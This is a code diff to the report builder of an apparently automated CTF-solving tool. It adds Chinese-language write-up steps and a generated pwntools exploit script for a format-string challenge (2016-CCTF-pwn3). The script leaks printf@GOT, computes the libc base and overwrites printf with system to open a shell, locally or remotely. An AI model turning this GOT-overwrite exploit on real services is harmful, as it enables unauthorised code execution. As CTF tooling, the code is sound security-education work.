@@ -109,12 +109,20 @@ class ReportBuilder:
         trace_path = flag_reports[0]["trace_path"] if flag_reports else solve_trace[:5]
         replay_steps = flag_reports[0]["replay_steps"] if flag_reports else []
         accepted_flag = accepted_flags[0] if accepted_flags else None
-        reproduction_steps = _reproduction_steps(path_steps, trace_path, replay_steps, attachments, accepted_flag=accepted_flag)
+        pwn_exploit_plan = _first_pwn_exploit_plan(findings)
+        if pwn_exploit_plan:
+            reproduction_steps = _pwn_exploit_reproduction_steps(pwn_exploit_plan, attachments)
+            approach_body = _pwn_exploit_approach_summary(pwn_exploit_plan)
+            exploit_script = _pwn_exploit_script_doc(challenge_id, pwn_exploit_plan, attachments)
+        else:
+            reproduction_steps = _reproduction_steps(path_steps, trace_path, replay_steps, attachments, accepted_flag=accepted_flag)
+            approach_body = _approach_summary(path_steps, findings)
+            exploit_script = None
 
         sections = [
             {
                 "title": "解题思路",
-                "body": _approach_summary(path_steps, findings),
+                "body": approach_body,
             },
             {
                 "title": "复现步骤",
@@ -122,8 +130,8 @@ class ReportBuilder:
                 "steps": reproduction_steps,
             },
         ]
-        markdown = _markdown_writeup(title, sections)
-        return {
+        markdown = _markdown_writeup(title, sections, exploit_script=exploit_script)
+        report = {
             "kind": "ctf_writeup",
             "title": title,
             "challenge_id": challenge_id,
@@ -136,6 +144,9 @@ class ReportBuilder:
             "sections": sections,
             "markdown": markdown,
         }
+        if exploit_script:
+            report["exploit_script"] = exploit_script
+        return report
 
 
 def _compact_evidence(evidence: dict[str, Any]) -> dict[str, Any]:
@@ -518,6 +529,212 @@ def _reproduction_steps(
     if trace_steps:
         return trace_steps[:5]
     return _fallback_replay_steps(path_steps)
+
+
+def _first_pwn_exploit_plan(findings: list[Finding]) -> dict[str, Any]:
+    for finding in reversed(findings):
+        if finding.solver != "PwnSolver":
+            continue
+        evidence = finding.evidence
+        if not isinstance(evidence, dict):
+            continue
+        plan = evidence.get("exploit_plan")
+        if isinstance(plan, dict):
+            workflow = str(plan.get("workflow") or evidence.get("workflow_guess") or "")
+            if workflow:
+                merged = dict(plan)
+                merged.setdefault("workflow", workflow)
+                return merged
+        workflow_guess = evidence.get("workflow_guess")
+        if workflow_guess:
+            return {"workflow": str(workflow_guess)}
+    return {}
+
+
+def _pwn_exploit_approach_summary(plan: dict[str, Any]) -> str:
+    workflow = plan.get("workflow")
+    if workflow == "ftp_heap_format_string":
+        return (
+            "关键点是 FTP 风格文件管理逻辑中的格式化字符串漏洞：先利用 `get` 路径泄露 printf@got，"
+            "计算 libc 基址和 system 地址，再用格式化字符串把 printf@got 改成 system，最后让程序打印 `/bin/sh` 进入 shell。"
+        )
+    return "关键点是把 pwn solver 给出的利用路线整理成可运行 exploit：先确认漏洞原语，再按本地/远程两种模式复现拿 shell。"
+
+
+def _pwn_exploit_reproduction_steps(plan: dict[str, Any], attachments: list[str]) -> list[str]:
+    binary = _basename(attachments[0]) if attachments else "challenge_binary"
+    workflow = plan.get("workflow")
+    if workflow == "ftp_heap_format_string":
+        login_input = plan.get("login_input") or "rxraclhm"
+        offset = plan.get("format_offset") or 7
+        return [
+            f"本地模式：把附件 {binary} 放在 exploit.py 同目录，执行 `python3 exploit.py --binary ./{binary}`。",
+            "远程模式：把 HOST/PORT 改成题目给出的地址端口，或执行 `python3 exploit.py --remote --host <host> --port <port>`。",
+            f"脚本先发送登录输入 `{login_input}`，进入 put/get 文件命令交互。",
+            "上传泄露 payload：在内容开头放 `printf@got`，再用 `%8$.4s` 从栈参数读取 GOT 指针处的 4 字节地址。",
+            "用泄露出的 printf 地址减去 libc 中 printf 偏移，得到 libc 基址，并计算 system 地址。",
+            f"用 `fmtstr_payload({offset}, {{printf@got: system}}, write_size='short')` 分两次短写覆盖 printf@got。",
+            "上传内容为 `/bin/sh` 的文件并执行 `get cmd`；此时原本的 printf(content) 已变成 system('/bin/sh')，脚本进入交互 shell。",
+        ]
+    return [
+        f"本地模式：把附件 {binary} 放在 exploit.py 同目录，执行 `python3 exploit.py --binary ./{binary}`。",
+        "远程模式：把 HOST/PORT 改成题目给出的地址端口，或执行 `python3 exploit.py --remote --host <host> --port <port>`。",
+        "按脚本中的漏洞原语发送 payload，确认能稳定进入 `io.interactive()`。",
+    ]
+
+
+def _pwn_exploit_script_doc(
+    challenge_id: str,
+    plan: dict[str, Any],
+    attachments: list[str],
+) -> dict[str, str]:
+    slug = _safe_filename_slug(challenge_id)
+    return {
+        "filename": f"exploit_{slug}.py",
+        "language": "python",
+        "content": _pwn_exploit_script(plan, attachments),
+    }
+
+
+def _pwn_exploit_script(plan: dict[str, Any], attachments: list[str]) -> str:
+    workflow = plan.get("workflow")
+    if workflow == "ftp_heap_format_string":
+        return _ftp_heap_format_string_exploit_script(plan, attachments)
+    binary = _basename(attachments[0]) if attachments else "challenge_binary"
+    return f"""#!/usr/bin/env python3
+from pwn import *
+import argparse
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="ForgeFlag pwn exploit skeleton")
+    parser.add_argument("--remote", action="store_true")
+    parser.add_argument("--host", default="127.0.0.1")
+    parser.add_argument("--port", type=int, default=31337)
+    parser.add_argument("--binary", default="./{binary}")
+    return parser.parse_args()
+
+
+def start(args):
+    if args.remote:
+        return remote(args.host, args.port)
+    return process(args.binary)
+
+
+def main():
+    args = parse_args()
+    io = start(args)
+    # Fill in the payload from the PwnSolver evidence, then keep the shell open.
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+"""
+
+
+def _ftp_heap_format_string_exploit_script(plan: dict[str, Any], attachments: list[str]) -> str:
+    binary = _basename(attachments[0]) if attachments else "2016-CCTF-pwn3"
+    login_input = str(plan.get("login_input") or "rxraclhm")
+    format_offset = int(plan.get("format_offset") or 7)
+    return f"""#!/usr/bin/env python3
+from pwn import *
+import argparse
+
+LOGIN_INPUT = b"{login_input}"
+FMT_OFFSET = {format_offset}
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="ForgeFlag generated exploit")
+    parser.add_argument("--remote", action="store_true")
+    parser.add_argument("--host", default="127.0.0.1")
+    parser.add_argument("--port", type=int, default=31337)
+    parser.add_argument("--binary", default="./{binary}")
+    parser.add_argument("--libc", default="", help="libc path; defaults to process libc lookup")
+    return parser.parse_args()
+
+
+def start(args):
+    if args.remote:
+        return remote(args.host, args.port)
+    return process(args.binary)
+
+
+def send_login(io):
+    io.recvuntil(b"Name (ftp.hacker.server:Rainism):")
+    io.sendline(LOGIN_INPUT)
+
+
+def put_file(io, name, content):
+    io.recvuntil(b"ftp>")
+    io.sendline(b"put")
+    io.recvuntil(b"please enter the name of the file you want to upload:")
+    io.sendline(name)
+    io.recvuntil(b"then, enter the content:")
+    io.sendline(content)
+
+
+def get_file(io, name):
+    io.recvuntil(b"ftp>")
+    io.sendline(b"get")
+    io.recvuntil(b"enter the file name you want to get:")
+    io.sendline(name)
+    return io.recvuntil(b"ftp>", drop=False)
+
+
+def leak_printf(io, elf):
+    payload = b"AAAA" + p32(elf.got["printf"]) + b".%8$.4s.END"
+    put_file(io, b"leak", payload)
+    data = get_file(io, b"leak")
+    marker = b"AAAA" + p32(elf.got["printf"]) + b"."
+    if marker not in data:
+        log.failure("leak marker not found; adjust the format argument index")
+        raise SystemExit(1)
+    leak = data.split(marker, 1)[1][:4]
+    if len(leak) != 4:
+        log.failure("short printf leak")
+        raise SystemExit(1)
+    return u32(leak)
+
+
+def resolve_libc(args, printf_leak):
+    if args.libc:
+        libc = ELF(args.libc, checksec=False)
+        libc.address = printf_leak - libc.symbols["printf"]
+        return libc
+    libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
+    libc.address = printf_leak - libc.symbols["printf"]
+    return libc
+
+
+def main():
+    args = parse_args()
+    context.binary = elf = ELF(args.binary, checksec=False)
+    context.log_level = "info"
+
+    io = start(args)
+    send_login(io)
+
+    printf_leak = leak_printf(io, elf)
+    log.success(f"printf leak: {{hex(printf_leak)}}")
+    libc = resolve_libc(args, printf_leak)
+    system_addr = libc.symbols["system"]
+    log.success(f"libc base: {{hex(libc.address)}}")
+    log.success(f"system: {{hex(system_addr)}}")
+
+    overwrite = fmtstr_payload(FMT_OFFSET, {{elf.got["printf"]: system_addr}}, write_size="short")
+    put_file(io, b"write", overwrite)
+    get_file(io, b"write")
+
+    put_file(io, b"cmd", b"/bin/sh")
+    get_file(io, b"cmd")
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+"""
 
 
 def _fallback_replay_steps(path_steps: list[dict[str, Any]]) -> list[str]:
@@ -1035,6 +1252,12 @@ def _basename(path: str) -> str:
     return path.rstrip("/").rsplit("/", 1)[-1] or path
 
 
+def _safe_filename_slug(value: str) -> str:
+    slug = "".join(char.lower() if char.isalnum() else "_" for char in value)
+    slug = "_".join(part for part in slug.split("_") if part)
+    return slug or "pwn"
+
+
 def _evidence_artifact_name(evidence: dict[str, Any]) -> str:
     artifact = evidence.get("artifact")
     if isinstance(artifact, dict):
@@ -1061,6 +1284,7 @@ def _string_list(value: object) -> list[str]:
 def _markdown_writeup(
     title: str,
     sections: list[dict[str, Any]],
+    exploit_script: dict[str, str] | None = None,
 ) -> str:
     lines = [f"# {title}", ""]
     for section in sections:
@@ -1069,4 +1293,9 @@ def _markdown_writeup(
             for index, step in enumerate(section["steps"], 1):
                 lines.append(f"{index}. {step}")
             lines.append("")
+    if exploit_script:
+        language = exploit_script.get("language") or "text"
+        filename = exploit_script.get("filename") or "exploit.py"
+        content = exploit_script.get("content") or ""
+        lines.extend(["### Exploit 脚本", "", f"`{filename}`", "", f"```{language}", content.rstrip(), "```", ""])
     return "\n".join(lines).strip() + "\n"
